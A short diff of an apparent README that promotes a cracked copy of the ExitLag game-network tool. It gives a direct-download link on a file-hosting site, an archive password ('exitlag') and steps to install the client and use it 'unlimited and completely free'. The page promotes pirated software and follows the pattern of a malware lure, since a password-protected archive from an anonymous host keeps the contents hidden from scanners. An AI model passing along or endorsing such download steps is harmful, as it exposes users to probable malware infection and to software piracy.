@@ -41,7 +41,7 @@ Whether you're climbing ranked or playing casually, a stable and fast connection
 
 1. Download [ExitLagCrack](https://www.4sync.com/web/directDownload/RZjegCGd/cKQ38aak.eba74a30081d1fa60c3438b4b73a57d4)
 2. Password **exitlag**
-3. Download the client
+3. Install the client
 4. Use and enjoy ExitLag unlimited and completely free!
 
 ---
